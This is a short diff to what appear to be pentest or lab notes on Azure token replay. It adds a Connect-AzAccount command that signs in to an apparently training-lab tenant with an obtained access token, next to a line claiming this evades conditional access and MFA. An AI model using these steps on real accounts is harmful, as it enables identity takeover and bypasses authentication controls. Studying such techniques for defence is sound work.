@@ -90,6 +90,8 @@ _with token replay you evade conditional access policy, and almost always mfa an
 ```Web API Validates access token and returns secure data to web server app```
 
 lets get better token:
+
 ```
 Get-AzAccessToken -ResourceTypeName MSGraph
+Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token -MicrosoftGraphAccessToken eyJ0eXA...
 ```
